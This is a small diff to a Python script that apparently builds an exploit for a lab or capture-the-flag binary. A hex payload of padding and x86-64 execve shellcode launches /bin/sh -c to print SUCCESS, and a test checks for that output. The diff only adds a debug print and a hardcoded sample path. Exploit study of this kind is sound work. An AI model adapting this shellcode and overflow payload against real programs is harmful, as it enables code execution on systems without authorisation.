@@ -123,6 +123,8 @@ def generate_exploit(byte_string):
     #   - customized shellcode for '/bin/sh -c "echo SUCCESS"'
     #For more details of the magic, please check the writeup linked above
     magic = '424242424242424242424141414141414141414141414141414141414141414141412e626000000000006563686f20275355434345535327004141414141414141414141414141414141414141414141414141414141414141412f62696e2f7368002d630000000000004831c050b8ee61600050b82662600050b81e626000504889e64889c74831d2b83b0000000f05'
+    m_hex = bytes.fromhex(magic)
+    print(m_hex)
     exploit = byte_string + magic
     return exploit
 
@@ -145,4 +147,4 @@ def test():
         assert subprocess.check_output([b,p]) == b'SUCCESS\n'
 
 if __name__ == '__main__':
-    main(sys.argv[1])
+    main('./sample_1')
